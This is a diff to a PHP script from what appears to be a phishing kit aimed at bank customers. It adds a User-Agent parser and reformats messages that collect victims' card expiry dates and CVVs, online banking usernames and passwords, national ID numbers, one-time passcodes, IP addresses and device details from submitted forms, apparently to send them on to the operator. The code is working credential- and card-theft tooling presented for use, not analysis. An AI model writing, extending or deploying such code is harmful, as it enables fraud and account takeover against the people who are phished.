@@ -11,9 +11,55 @@ function getUserIP() {
     }
 }
 
+// Función para simplificar el User-Agent
+function parseUserAgent($u_agent) {
+    $browser = 'Desconocido';
+    $version = '';
+    $platform = 'Desconocido';
+
+    // Detectar plataforma
+    if (preg_match('/linux/i', $u_agent)) {
+        $platform = 'Linux';
+    } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
+        $platform = 'Mac';
+    } elseif (preg_match('/windows|win32/i', $u_agent)) {
+        $platform = 'Windows';
+    }
+
+    // Detectar navegador
+    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
+        $browser = 'Internet Explorer';
+    } elseif(preg_match('/Firefox/i',$u_agent)){
+        $browser = 'Firefox';
+    } elseif(preg_match('/Chrome/i',$u_agent)){
+        $browser = 'Chrome';
+    } elseif(preg_match('/Safari/i',$u_agent)){
+        $browser = 'Safari';
+    } elseif(preg_match('/Opera/i',$u_agent)){
+        $browser = 'Opera';
+    } elseif(preg_match('/Netscape/i',$u_agent)){
+        $browser = 'Netscape';
+    }
+
+    // Extraer versión del navegador
+    $known = array('Version', $browser, 'other');
+    $pattern = '#(?<browser>' . join('|', $known) .
+    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
+
+    if (preg_match_all($pattern, $u_agent, $matches)) {
+        if (count($matches['browser']) > 1) {
+            $version = $matches['version'][1];
+        } else {
+            $version = $matches['version'][0];
+        }
+    }
+
+    return $browser . " " . $version . " / " . $platform;
+}
+
 $hash = $_POST['form'];
 $user_ip = getUserIP();
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$user_agent = parseUserAgent($_SERVER['HTTP_USER_AGENT']);
 
 if($hash == '1'){
     $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
@@ -23,7 +69,7 @@ if($hash == '1'){
            "📅 *Expira:* ".$_POST["month"]."/".$_POST["year"]."\n".
            "🔐 *CVV:* ".$_POST["cvv"]."\n\n".
            "🌍 *IP:* `".$user_ip."`\n".
-           "🖥 *User-Agent:* _".$user_agent."_" ;
+           "🖥 *Dispositivo:* ".$user_agent ;
 }
 
 if($hash == '2'){
@@ -32,7 +78,7 @@ if($hash == '2'){
            "👨‍💻 *Usuario:* ".$_POST["txt-usuario"]."\n".
            "🔑 *Contraseña:* ".$_POST['txt-password']."\n\n".
            "🌍 *IP:* `".$user_ip."`\n".
-           "🖥 *User-Agent:* _".$user_agent."_" ;
+           "🖥 *Dispositivo:* ".$user_agent ;
 }
 
 if($hash == '3' || $hash == '4'){
@@ -40,7 +86,7 @@ if($hash == '3' || $hash == '4'){
            "👤 *Cédula:* `".$_POST['cedula']."`\n".
            "📲 *OTP:* ".$_POST["txt-otp-nuevo"]."\n\n".
            "🌍 *IP:* `".$user_ip."`\n".
-           "🖥 *User-Agent:* _".$user_agent."_" ;
+           "🖥 *Dispositivo:* ".$user_agent ;
 }
 
 if (!empty($msg)) {
